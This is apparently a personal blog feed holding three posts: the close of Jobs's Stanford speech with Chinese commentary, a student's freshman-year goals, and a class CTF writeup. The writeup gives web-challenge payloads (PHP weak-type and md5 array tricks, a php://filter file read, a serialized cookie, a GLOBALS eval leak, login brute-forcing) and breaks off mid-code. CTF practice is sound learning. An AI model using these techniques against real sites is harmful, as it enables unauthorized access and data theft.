<p>I’m pretty sure none of this would have happened if I hadn’t been fired from Apple. It was awful tasting medicine, but I guess the patient needed it. <strong><em>Sometimes life hits you in the head with a brick.</em></strong> Don’t lose faith. <strong><em>I’m convinced that the only thing that kept me going was that I loved what I did. You’ve got to find what you love. And that is as true for your work as it is for your lovers.</em></strong> Your work is going to fill a large part of your life, and the only way to be truly satisfied is to do what you believe is great work. <strong><em>And the only way to do great work is to love what you do.</em></strong> If you haven’t found it yet, keep looking. Don’t settle. As with all matters of the heart, you’ll know when you find it. <strong><em>And, like any great relationship, it just gets better and better as the years roll on.</em></strong> So keep looking until you find it. Don’t settle.</p>
<p><strong>My third story is about death.</strong></p>
<p>When I was 17, I read a quote that went something like: <strong><em>“If you live each day as if it was your last, someday you’ll most certainly be right.”</em></strong> It made an impression on me, and since then, for the past 33 years, I have looked in the mirror every morning and asked myself: “If today were the last day of my life, would I want to do what I am about to do today?” And whenever the answer has been “No” for too many days in a row, I know I need to change something.</p>
<p>Remembering that I’ll be dead soon is the most important tool I’ve ever encountered to help me make the big choices in life. <strong><em>Because almost everything — all external expectations, all pride, all fear of embarrassment or failure - these things just fall away in the face of death, leaving only what is truly important.</em></strong> Remembering that you are going to die is the best way I know to avoid the trap of thinking you have something to lose. You are already naked. There is no reason not to follow your heart.</p>
<p>About a year ago I was diagnosed with cancer. I had a scan at 7:30 in the morning, and it clearly showed a tumor on my pancreas. I didn’t even know what a pancreas was. The doctors told me this was almost certainly a type of cancer that is incurable, and that I should expect to live no longer than three to six months. My doctor advised me to go home and get my affairs in order, which is doctor’s code for prepare to die. It means to try to tell your kids everything you thought you’d have the next 10 years to tell them in just a few months. It means to make sure everything is buttoned up so that it will be as easy as possible for your family. It means to say your goodbyes.</p>
<p>I lived with that diagnosis all day. Later that evening I had a biopsy, where they stuck an endoscope down my throat, through my stomach and into my intestines, put a needle into my pancreas and got a few cells from the tumor. I was sedated, but my wife, who was there, told me that when they viewed the cells under a microscope the doctors started crying because it turned out to be a very rare form of pancreatic cancer that is curable with surgery. I had the surgery and I’m fine now.</p>
<p>This was the closest I’ve been to facing death, and I hope its the closest I get for a few more decades. Having lived through it, I can now say this to you with a bit more certainty than when death was a useful but purely intellectual concept:</p>
<p>No one wants to die. Even people who want to go to heaven don’t want to die to get there. And yet death is the destination we all share. No one has ever escaped it. And that is as it should be, because Death is very likely the single best invention of Life. It is Life’s change agent. It clears out the old to make way for the new. Right now the new is you, but someday not too long from now, you will gradually become the old and be cleared away. Sorry to be so dramatic, but it is quite true.</p>
<p><strong><em>Your time is limited, so don’t waste it living someone else’s life.</em></strong> Don’t be trapped by dogma — which is living with the results of other people’s thinking. Don’t let the noise of others’ opinions drown out your own inner voice. <strong><em>And most important, have the courage to follow your heart and intuition.</em></strong> They somehow already know what you truly want to become. Everything else is secondary.</p>
<p>When I was young, there was an amazing publication called The Whole Earth Catalog, which was one of the bibles of my generation. It was created by a fellow named Stewart Brand not far from here in Menlo Park, and he brought it to life with his poetic touch. This was in the late 1960’s, before personal computers and desktop publishing, so it was all made with typewriters, scissors, and polaroid cameras. It was sort of like Google in paperback form, 35 years before Google came along: it was idealistic, and overflowing with neat tools and great notions.</p>
<p>Stewart and his team put out several issues of The Whole Earth Catalog, and then when it had run its course, they put out a final issue. It was the mid-1970s, and I was your age. On the back cover of their final issue was a photograph of an early morning country road, the kind you might find yourself hitchhiking on if you were so adventurous. Beneath it were the words: <strong><em>“Stay Hungry. Stay Foolish.”</em></strong> It was their farewell message as they signed off. Stay Hungry. Stay Foolish. And I have always wished that for myself. And now, as you graduate to begin anew, I wish that for you.</p>
<p>Stay Hungry. Stay Foolish.</p>
<p>Thank you all very much.</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm4tcn2looj30im0ook49.jpg" alt=""></p>
<hr>
<h4 id="Perceptions"><a href="#Perceptions" class="headerlink" title="Perceptions"></a>Perceptions</h4><h5 id="虽然有时候自己的好奇心或直觉会让自己陷入窘境，但是后来事实证明，这些经历都是无价的。"><a href="#虽然有时候自己的好奇心或直觉会让自己陷入窘境，但是后来事实证明，这些经历都是无价的。" class="headerlink" title="虽然有时候自己的好奇心或直觉会让自己陷入窘境，但是后来事实证明，这些经历都是无价的。"></a>虽然有时候自己的好奇心或直觉会让自己陷入窘境，但是后来事实证明，这些经历都是无价的。</h5><blockquote>
<p><em>I loved it.</em></p>
<p><strong><em>And much of what I stumbled into by following my curiosity and intuition turned out to be priceless later on.</em></strong></p>
<blockquote>
<p>我跟着我的直觉和好奇心走, 遇到的很多东西,此后被证明是无价之宝。</p>
</blockquote>
</blockquote>
<hr>
<h5 id="随着年龄的增长，对各种事物的看法就会发生微妙的变化。"><a href="#随着年龄的增长，对各种事物的看法就会发生微妙的变化。" class="headerlink" title="随着年龄的增长，对各种事物的看法就会发生微妙的变化。"></a>随着年龄的增长，对各种事物的看法就会发生微妙的变化。</h5><h5 id="对我而言：做啥事，何必过分在意别人的言语，走自己的路，因果早已埋下，问心无愧足矣。"><a href="#对我而言：做啥事，何必过分在意别人的言语，走自己的路，因果早已埋下，问心无愧足矣。" class="headerlink" title="对我而言：做啥事，何必过分在意别人的言语，走自己的路，因果早已埋下，问心无愧足矣。"></a>对我而言：做啥事，何必过分在意别人的言语，走自己的路，因果早已埋下，问心无愧足矣。</h5><blockquote>
<p><em>Again, you can’t connect the dots looking forward; you can only connect them looking backwards.</em></p>
<blockquote>
<p>当然我在大学的时候，还不可能把从前的点点滴滴串连起来,但是当我十年后回顾这一切的时候,真的豁然开朗了。 </p>
</blockquote>
<p><strong><em>So you have to trust that the dots will somehow connect in your future. You have to trust in something — your gut, destiny, life, karma, whatever. This approach has never let me down, and it has made all the difference in my life.</em></strong></p>
<blockquote>
<p>再次说明的是,你在向未来展望的时候不可能将这些片断串连起来，你只能在回顾的时候串起他们。所以你必须相信这些片断会在你未来的某一天串连起来，你必须要相信某些东西：你的勇气、目的、生命、因缘……这个过程从来没有令我失望,只是让我的生命更加地与众不同。 </p>
</blockquote>
</blockquote>
<hr>
<h5 id="没有谁的一生是一帆风顺的，所以总会碰到不如意的事情，或许这就是“天将降大任于斯人也，必先苦其心志，劳其筋骨，饿其体肤，空乏其身，行指乱其所为，所以动心忍性，曾益其所不能“？"><a href="#没有谁的一生是一帆风顺的，所以总会碰到不如意的事情，或许这就是“天将降大任于斯人也，必先苦其心志，劳其筋骨，饿其体肤，空乏其身，行指乱其所为，所以动心忍性，曾益其所不能“？" class="headerlink" title="没有谁的一生是一帆风顺的，所以总会碰到不如意的事情，或许这就是“天将降大任于斯人也，必先苦其心志，劳其筋骨，饿其体肤，空乏其身，行指乱其所为，所以动心忍性，曾益其所不能“？"></a>没有谁的一生是一帆风顺的，所以总会碰到不如意的事情，或许这就是“天将降大任于斯人也，必先苦其心志，劳其筋骨，饿其体肤，空乏其身，行指乱其所为，所以动心忍性，曾益其所不能“？</h5><h5 id="我也希望“唯一使我一直走下去的，就是我做的事情令我无比钟爱“。"><a href="#我也希望“唯一使我一直走下去的，就是我做的事情令我无比钟爱“。" class="headerlink" title="我也希望“唯一使我一直走下去的，就是我做的事情令我无比钟爱“。"></a>我也希望“唯一使我一直走下去的，就是我做的事情令我无比钟爱“。</h5><h5 id="自我认同是一剂良药。"><a href="#自我认同是一剂良药。" class="headerlink" title="自我认同是一剂良药。"></a>自我认同是一剂良药。</h5><h5 id="想起了Randy-Pausch的《最后一课》上的一句话“When-it-comes-to-someone-who-is-romantically-interested-in-you-just-igore-everything-he-says-and-only-pay-attention-to-what-he-did-”-So，任何敌不过时间考验的海誓山盟都是一派胡言！"><a href="#想起了Randy-Pausch的《最后一课》上的一句话“When-it-comes-to-someone-who-is-romantically-interested-in-you-just-igore-everything-he-says-and-only-pay-attention-to-what-he-did-”-So，任何敌不过时间考验的海誓山盟都是一派胡言！" class="headerlink" title="想起了Randy Pausch的《最后一课》上的一句话“When it comes to someone who is romantically interested in you, just igore everything he says and only pay attention to what he did.”  So，任何敌不过时间考验的海誓山盟都是一派胡言！"></a>想起了Randy Pausch的《最后一课》上的一句话<em>“When it comes to someone who is romantically interested in you, just igore everything he says and only pay attention to what he did.”</em>  So，任何敌不过时间考验的海誓山盟都是一派胡言！</h5><blockquote>
<p><strong><em>Sometimes life hits you in the head with a brick.</em></strong> <em>Don’t lose faith.</em> </p>
<blockquote>
<p>有些时候, 生活会拿起一块砖头向你的脑袋上猛拍一下，不要失去信仰。</p>
</blockquote>
<p><strong><em>I’m convinced that the only thing that kept me going was that I loved what I did. You’ve got to find what you love. And that is as true for your work as it is for your lovers.</em></strong> </p>
<blockquote>
<p>我很清楚唯一使我一直走下去的，就是我做的事情令我无比钟爱。你需要去找到你所爱的东西。对于工作是如此, 对于你的爱人也是如此。</p>
</blockquote>
<p><strong><em>And the only way to do great work is to love what you do.</em></strong></p>
<blockquote>
<p>你只有相信自己所做的是伟大的工作, 你才能怡然自得。</p>
</blockquote>
<p><strong><em>And, like any great relationship, it just gets better and better as the years roll on.</em></strong></p>
<blockquote>
<p>就像任何真诚的关系, 随着岁月的流逝只会越来越紧密。</p>
</blockquote>
</blockquote>
<hr>
<h5 id="这或许有点难，但是，朝着这个方向努力吧！"><a href="#这或许有点难，但是，朝着这个方向努力吧！" class="headerlink" title="这或许有点难，但是，朝着这个方向努力吧！"></a>这或许有点难，但是，朝着这个方向努力吧！</h5><h5 id="生命是宝贵的，死后就算你拥有万贯家财，你也无法带到下面去用，及时行善，及时行乐。"><a href="#生命是宝贵的，死后就算你拥有万贯家财，你也无法带到下面去用，及时行善，及时行乐。" class="headerlink" title="生命是宝贵的，死后就算你拥有万贯家财，你也无法带到下面去用，及时行善，及时行乐。"></a>生命是宝贵的，死后就算你拥有万贯家财，你也无法带到下面去用，及时行善，及时行乐。</h5><h5 id="当自己患得患失时，让“记住你即将死去”回荡在你的脑海里，你就会释怀。"><a href="#当自己患得患失时，让“记住你即将死去”回荡在你的脑海里，你就会释怀。" class="headerlink" title="当自己患得患失时，让“记住你即将死去”回荡在你的脑海里，你就会释怀。"></a>当自己患得患失时，让“记住你即将死去”回荡在你的脑海里，你就会释怀。</h5><h5 id="不必羡慕别人的生活，每个人都是独一无二的。"><a href="#不必羡慕别人的生活，每个人都是独一无二的。" class="headerlink" title="不必羡慕别人的生活，每个人都是独一无二的。"></a>不必羡慕别人的生活，每个人都是独一无二的。</h5><h5 id="聆听自己内心的声音，做最真实的自己，做自己想成为的自己-。"><a href="#聆听自己内心的声音，做最真实的自己，做自己想成为的自己-。" class="headerlink" title="聆听自己内心的声音，做最真实的自己，做自己想成为的自己 。"></a>聆听自己内心的声音，做最真实的自己，做自己想成为的自己 。</h5><blockquote>
<p><strong><em>“If you live each day as if it was your last, someday you’ll most certainly be right.”</em></strong></p>
<blockquote>
<p>”如果你把每一天都当作生命中最后一天去生活的话,那么有一天你会发现你是正确的。”</p>
</blockquote>
<p><em>Remembering that I’ll be dead soon is the most important tool I’ve ever encountered to help me make the big choices in life. **</em>Because almost everything — all external expectations, all pride, all fear of embarrassment or failure - these things just fall away in the face of death, leaving only what is truly important.<em>** Remembering that you are going to die is the best way I know to avoid the trap of thinking you have something to lose. You are already naked. There is no reason not to follow your heart.</em></p>
<blockquote>
<p>“记住你即将死去”是我一生中遇到的最重要箴言。它帮我指明了生命中重要的选择。因为几乎所有的事情, 包括所有的荣誉、所有的骄傲、所有对难堪和失败的恐惧,这些在死亡面前都会微不足道。我看到的是留下的真正重要的东西。你有时候会思考你将会失去某些东西, “记住你即将死去”是我知道的避免这些想法的最好办法。如果你清空一切, 你没有理由不去跟随自己内心的声音。 </p>
</blockquote>
<p><strong><em>Your time is limited, so don’t waste it living someone else’s life.</em></strong></p>
<blockquote>
<p>你们的时间很有限, 所以不要将他们浪费在重复其他人的生活上。</p>
</blockquote>
<p><strong><em>And most important, have the courage to follow your heart and intuition.</em></strong> <em>They somehow already know what you truly want to become. Everything else is secondary.</em></p>
<blockquote>
<p>还有最重要的是, 你要有勇气去听从你直觉和心灵的指示——它们在某种程度上知道你想要成为什么样子，所有其他的事情都是次要的。 </p>
</blockquote>
</blockquote>
<hr>
<h2 id="Stay-Hungry-Stay-Foolish"><a href="#Stay-Hungry-Stay-Foolish" class="headerlink" title="Stay Hungry. Stay Foolish."></a>Stay Hungry. Stay Foolish.</h2><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm4tcyl6uqj312m0zmwx4.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Perception </tag>
            
            <tag> 心路历程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[It's time to set Flags in Freshman Year (持续更新)]]></title>
      <url>/2017/12/03/Flaggs1/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>不知不觉大一上已经过了一半了。。一直想抽时间写总结和立下Flags，好让自己不懒惰。<br><br>终于现在各种事情也处理的差不多了，在备考期末的同时，可以静下来写点东西和思考一下接下来的路了……<a id="more"></a></excerpt></p>
<p><the rest="" of="" contents="" |="" 余下全文=""><br><br><br>从开学到11月底，几乎每天都是早出晚归的节奏：<br>早上6.40起床刷牙洗脸—&gt;跑操<br>……<br>晚自习21:10结束—&gt;23：10排练演出节目—&gt;回寝室<br>当一切收拾好，瘫坐在床上的时候，发现已经过了12点了。有时候才想起我的高数/线代好像。。。。还没有。。写完！然后又爬起来，挑灯夜读。。。<br>虽然这段时间累是累了点，但是让我如愿以偿地登上了迎新晚会的舞台，为几个协会的活动友情演出了一波，还客串了一下“新光大道”才艺大赛。对于一个舞者来说，何必去在意上台前苦练的心酸，当自己站在舞台上，被彩灯、追光灯亮瞎了眼的时候，什么心酸痛苦，早已忘得一干二净，只剩下享受舞台的自己！<br>在这繁忙、充实的生活中，其实还去打了Geek和班级对抗赛，虽然两次成绩都还可以，但是都是有身边dalao们的帮助。作为一个小白，当你真正去打比赛时，你就会发现自己的路还长，总会有一些脑洞大开而且还要用你没有学过的东西去答题，因此着对学习能力的要求就很高（尤其是快速学习的能力）。<br><br><br>总的来说，这段时间，累并快乐着，因为<br>干着自己爱干的事：</the></p>
<p>1.经过重重筛选淘汰，登上了迎新晚会的舞台</p>
<p>2.搭起了自己的<a href="http://karmaof.me/" target="_blank" rel="noopener">Blog</a></p>
<p>3.拉丁舞协会的宣传工作（Logo重新设计、微信公众号、视频编辑整理）</p>
<p>4.Web SKill Learning —&gt;SQL Injection、XSS</p>
<p><br><br>还认识了有趣的童鞋和深藏不露的dalao们，也结识了一群兴趣相投的小可爱们(｡◕ˇ∀ˇ◕）<br><br></p>
<h4 id="————华丽的分割线————"><a href="#————华丽的分割线————" class="headerlink" title="————华丽的分割线————"></a><center>————华丽的分割线————</center></h4><p>总结完了前段时间的快乐与收获，也该说些沉重的话题了……</p>
<p>工程导论的结课作业除了答辩就是写大学四年人生规划，人生规划课老师节节课离不开提醒我们设立小目标、规划自己的学习生活、情感生活……（毕竟她本人就是靠着实现这一年又一年的目标，达到今天的成就）<br><br><br>其实也不无道理，没有规划，人就没有动力；没有目标，人就容易散漫。<br><br><br>寝室里，还真不是一个学习的好地方，不是打游戏就是煲剧……所以我选择泡图书馆……<br><br></p>
<p>前几天看到一篇CET6模拟的英语作文题：是选择保证未来光明的工作还是感兴趣的工作</p>
<p>于我来说，二者是可以得兼的（虽然在考场上我会选择写后者），因为当年我听完习大大”没有网络安全就没有国家安全”的演讲，我就觉得Information Security是一个前途光明的工作，于是，在我略微了解之后，Information Security就成了我感兴趣的专业，于是就顺理成章的入了门……</p>
<p><br><br>扯远了扯远了(￣∇￣)<br><br></p>
<h4 id="人，总是要活在压力下，才会不断地鞭笞自己向前……"><a href="#人，总是要活在压力下，才会不断地鞭笞自己向前……" class="headerlink" title="人，总是要活在压力下，才会不断地鞭笞自己向前……"></a>人，总是要活在压力下，才会不断地鞭笞自己向前……</h4><p><br></p>
<h3 id="In-my-freshman-year"><a href="#In-my-freshman-year" class="headerlink" title="In my freshman year:"></a>In my freshman year:</h3><h4 id="1-要考试的科目均分-gt-90"><a href="#1-要考试的科目均分-gt-90" class="headerlink" title="1.要考试的科目均分&gt;=90"></a>1.要考试的科目均分&gt;=90</h4><p>​    Include：公共课（高数、线代、英语、计算机基础……）、专业课   </p>
<h4 id="2-Skills-TOP-10-of-whole-grade"><a href="#2-Skills-TOP-10-of-whole-grade" class="headerlink" title="2.Skills TOP 10 of whole grade"></a>2.Skills TOP 10 of whole grade</h4><h4 id="3-自学Python、C、Web漏洞类型、读几本技术书"><a href="#3-自学Python、C、Web漏洞类型、读几本技术书" class="headerlink" title="3.自学Python、C、Web漏洞类型、读几本技术书"></a>3.自学Python、C、Web漏洞类型、读几本技术书</h4><h4 id="4-High-Mark-pass-CET4、CET6"><a href="#4-High-Mark-pass-CET4、CET6" class="headerlink" title="4.High Mark pass CET4、CET6"></a>4.High Mark pass CET4、CET6</h4><h4 id="5-社团活动-好像完成的差不多了QAQ-—-gt-提升个人魅力、各项能力"><a href="#5-社团活动-好像完成的差不多了QAQ-—-gt-提升个人魅力、各项能力" class="headerlink" title="5.社团活动(好像完成的差不多了QAQ)—&gt;提升个人魅力、各项能力"></a>5.社团活动(好像完成的差不多了QAQ)—&gt;提升个人魅力、各项能力</h4><h4 id="6-拿到驾照"><a href="#6-拿到驾照" class="headerlink" title="6.拿到驾照"></a>6.拿到驾照</h4><p><br><br>奉上《工程导论》大学四年人生规划思维导图，警醒自己，也希望大家监督！</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fn0eeol58zj31481da7fh.jpg" alt=""></p>
<h2 id="坚持你所热爱的，热爱你所坚持的，剩下的，交给时间就好。"><a href="#坚持你所热爱的，热爱你所坚持的，剩下的，交给时间就好。" class="headerlink" title="坚持你所热爱的，热爱你所坚持的，剩下的，交给时间就好。"></a><center>坚持你所热爱的，热爱你所坚持的，剩下的，交给时间就好。</center></h2>]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Flag </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2017班级对抗赛WP&心得]]></title>
      <url>/2017/12/01/2017%E7%8F%AD%E7%BA%A7%E5%AF%B9%E6%8A%97%E8%B5%9BWP+%E5%BF%83%E5%BE%97/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>    Geek 之后又来了一波班级对抗赛，成绩不是最重要的，主要是想见见世面，涨涨见识。知己知彼，百战不殆嘛！<a id="more"></a></excerpt></p>
<the rest="" of="" contents="" |="" 余下全文="">

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="简单代码审计（送分）by-Ph0rse"><a href="#简单代码审计（送分）by-Ph0rse" class="headerlink" title="简单代码审计（送分）by  Ph0rse"></a>简单代码审计（送分）by  Ph0rse</h2><h3 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h3><p><a href="http://45.32.90.22:2501/index.php" target="_blank" rel="noopener">http://45.32.90.22:2501/index.php</a></p>
<h3 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h3><p>代码审计，PHP弱类型</p>
<h3 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>1、Base64解密<br>2、变量覆盖<br>3、md5弱类型相等<br>4、md5数组加密漏洞</p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p><a href="http://45.32.90.22:2501/index.php?name=xiaohong&amp;sex=nv&amp;key=240610708&amp;pen[]=1&amp;apple[]=2" target="_blank" rel="noopener">http://45.32.90.22:2501/index.php?name=xiaohong&amp;sex=nv&amp;key=240610708&amp;pen[]=1&amp;apple[]=2</a></p>
<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>D0G3{BAC0N_IS_TASTY!}</p>
<p>Writeup：</p>
<p>送分代码审计 看源码啥也没有，考虑源码泄露。而且源码里面base64也提示了<img src="https://ws4.sinaimg.cn/large/006tKfTcly1fm1gs4a6g0j30km0f4wfj.jpg" alt=""> </p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fm1gtzr8ctj30pu0zk4dy.jpg" alt=""></p>
<p>这里给一个学习php弱类型的网站：<a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html" target="_blank" rel="noopener">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a></p>
<h5 id="划重点："><a href="#划重点：" class="headerlink" title="划重点："></a>划重点：</h5><p>源码泄露</p>
<h2 id="Myblog-Typecho——EXP-by-Ph0rse"><a href="#Myblog-Typecho——EXP-by-Ph0rse" class="headerlink" title="Myblog  Typecho——EXP   by   Ph0rse"></a>Myblog  Typecho——EXP   by   Ph0rse</h2><h3 id="环境地址"><a href="#环境地址" class="headerlink" title="环境地址"></a>环境地址</h3><p><a href="http://45.32.90.22:2502/" target="_blank" rel="noopener">http://45.32.90.22:2502/</a><br>数据库密码为空，但限制了只有本地IP可以访问<br>后台管理员账号密码为D0g233333</p>
<h3 id="考察知识点-1"><a href="#考察知识点-1" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>快速锁定版本号，搜索exp，getshell<br>反序列化<br>快速代码审计</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><a href="http://ph0rse.me/2017/10/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BTypecho%E4%BA%8C%E8%BF%9E%E7%88%86/3" target="_blank" rel="noopener">http://ph0rse.me/2017/10/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BTypecho%E4%BA%8C%E8%BF%9E%E7%88%86/3</a></p>
<h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h3><p>D0g3{th1s_here_hihihi}</p>
<h5 id="Question"><a href="#Question" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<h2 id="secret-code-by-Sn00py"><a href="#secret-code-by-Sn00py" class="headerlink" title="secret code  by  Sn00py"></a>secret code  by  Sn00py</h2><h3 id="考察知识点-2"><a href="#考察知识点-2" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>1.php源码加密</p>
<h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><p><a href="http://222.18.158.244:4141/" target="_blank" rel="noopener">http://222.18.158.244:4141/</a> post:debug=1&amp;file=flag.php<br>burpsuite下拷贝加密源码到flag.php,包含flag.php,输出全局变量.</p>
<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h3><p>D0g3{hava_fun!!!!!!}</p>
<h5 id="Question-1"><a href="#Question-1" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<h2 id="血红的双眼-by-C1em0"><a href="#血红的双眼-by-C1em0" class="headerlink" title="血红的双眼 by C1em0"></a>血红的双眼 by C1em0</h2><h3 id="题目名"><a href="#题目名" class="headerlink" title="题目名"></a>题目名</h3><p>《血红的双眼》 by C1em0</p>
<h3 id="考察内容"><a href="#考察内容" class="headerlink" title="考察内容"></a>考察内容</h3><p>sql布尔盲注，过滤绕过，python脚本编写，bp使用。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><p>根据测出的过滤处进行编写脚本或者用bp跑就行，python脚本注意编码问题。</p>
<h5 id="Question-2"><a href="#Question-2" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<h2 id="WEB-64号基地-by-zev3n"><a href="#WEB-64号基地-by-zev3n" class="headerlink" title="WEB-64号基地  by zev3n"></a>WEB-64号基地  by zev3n</h2><h3 id="题目地址-1"><a href="#题目地址-1" class="headerlink" title="题目地址"></a>题目地址</h3><p>还没传到服务器。。。</p>
<h3 id="题目类型-1"><a href="#题目类型-1" class="headerlink" title="题目类型"></a>题目类型</h3><p>文件包含导致的任意文件读取</p>
<h3 id="考察知识点-3"><a href="#考察知识点-3" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>1.php伪协议<br>2.伪协议中filter过滤器的常见种类</p>
<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>1.点开页面中的链接，得到file参数的提示，应该想到文件包含<br>2.尝试用php://filter/read=<strong>convert.base64-encode</strong>/resourse=index.php读取出本页面的源码<br>3.读出“源码”的base64，解密后发现没有想象中那么简单<br>4.使用<strong>string.rot13</strong>过滤器重新读取，解密后得到flag</p>
<h2 id="What-remains-of-Bruce-Finch-by-Skye"><a href="#What-remains-of-Bruce-Finch-by-Skye" class="headerlink" title="What remains of Bruce Finch  by Skye"></a>What remains of Bruce Finch  by Skye</h2><h3 id="链接：http-222-18-158-244-4151"><a href="#链接：http-222-18-158-244-4151" class="headerlink" title="链接：http://222.18.158.244:4151/"></a>链接：<a href="http://222.18.158.244:4151/" target="_blank" rel="noopener">http://222.18.158.244:4151/</a></h3><h3 id="考察：暴力破解，两次加密处理，firebug使用（删除节点）"><a href="#考察：暴力破解，两次加密处理，firebug使用（删除节点）" class="headerlink" title="考察：暴力破解，两次加密处理，firebug使用（删除节点）"></a>考察：暴力破解，两次加密处理，firebug使用（删除节点）</h3><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>firebug中删除节点，将干扰字幕除去，进入表单，用burpsuite对用户名和密码进行爆破，用户名根据提示中的四个名字。用户名是Edith，密码123321，用burp的时候又MD5和base64加密。<br>flag：Dog3{Brut3_f0rc3_50_e45y}</p>
<h5 id="Question-3"><a href="#Question-3" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<h2 id="计算题-by-We2sWing"><a href="#计算题-by-We2sWing" class="headerlink" title="计算题 by We2sWing"></a>计算题 by We2sWing</h2><p>浏览器F12看源码 改长度  得到base64加密和url加密的字符串  解密一次即可</p>
<p>By myself:</p>
<p>改长度+base64解密</p>
<p><img src="file:////Users/akk/Library/Group%20Containers/UBF8T346G9.Office/msoclip1/01/clip_image002.png" alt="img"></p>
<p>flag{D0g3_happy~}</p>
<h2 id="加0题-by-We2sWing"><a href="#加0题-by-We2sWing" class="headerlink" title="加0题 by We2sWing"></a>加0题 by We2sWing</h2><p>robot.txt 直接在网页后面加一个robot.txt 进去就能看源码 在根据源码 去url编码字符串</p>
<p>writeup：</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1guxx7wpj30cs05y74n.jpg" alt=""></p>
<p>页面给出robo.txt提示 访问</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1gvbag93j30j80r80xs.jpg" alt=""></p>
<p>url编码，传输过去后会被默认解码一次，所以将jia0编码两次，再传入就可以得到flag</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fm1gvouzpdj30ny0c4mzc.jpg" alt=""></p>
<h2 id="Love-China-by-汪子豪"><a href="#Love-China-by-汪子豪" class="headerlink" title="Love China  by 汪子豪"></a>Love China  by 汪子豪</h2><p>JavaScript操作题 在浏览器控制台让clicks大于1000000就行（也可以使用POST提交） </p>
<p>By myself：</p>
<p>肯定不可能真的点100w次，所以。。</p>
<p>查看源码：</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fm1gwl78c8j30m8046wfg.jpg" alt=""></p>
<p>发现点击次数会post到后台，所以只要在hackbar上面改改数据，就可以拿到flag </p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fm1gwxewwhj30p60h0gne.jpg" alt=""></p>
<h2 id="php反序列化-by-汪子豪"><a href="#php反序列化-by-汪子豪" class="headerlink" title="php反序列化 by 汪子豪"></a>php反序列化 by 汪子豪</h2><p>PHP反序列化，给提示:hint<br>登录没反应，提示:GET一个hint就有源代码<br> 审计代码，要传一个cookie名为D0g3的反序列值。并且反序列后的值要全等于$KEY<br>注意这里穿进去的是空，即<br>payload<br>Cookie: s:0:””;</p>
<h5 id="Question-4"><a href="#Question-4" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<h2 id="web1-by-drac0nids"><a href="#web1-by-drac0nids" class="headerlink" title="web1: by drac0nids"></a>web1: by drac0nids</h2><p>直接post一个超全局变量GLOBALS</p>
<p>Writeup：</p>
<p>进去直接源码出来， </p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1gxua1utj30k40a60ut.jpg" alt=""></p>
<p>看到最后一行，eval(“var_dump($$args)”)   可变变量，传一个全局数组变量。args=GLOBALS</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fm1gy3lkpaj30ps08otck.jpg" alt=""></p>
<h5 id="Question-5"><a href="#Question-5" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<h2 id="web2-by-drac0nids"><a href="#web2-by-drac0nids" class="headerlink" title="web2: by drac0nids"></a>web2: by drac0nids</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>    <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"><span 